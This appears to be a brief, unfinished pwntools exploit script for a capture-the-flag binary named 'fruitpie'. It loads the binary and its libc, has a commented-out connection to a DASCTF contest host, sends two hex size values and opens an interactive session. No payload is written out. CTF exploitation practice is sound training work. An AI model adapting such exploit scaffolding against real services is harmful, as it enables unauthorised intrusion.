from pwn import *
#p=remote("54f57bff-61b7-47cf-a0ff-f23c4dc7756a.machine.dasctf.com","51202")
context.log_level = "debug"
p = process("./fruitpie")
elf = ELF("./fruitpie")
libc = ELF("./libc/libc.so.6")


p.sendlineafter(":\n","0x90")
p.sendlineafter(":\n","0x10")
#gdb.attach(p)
#pause()

p.interactive()
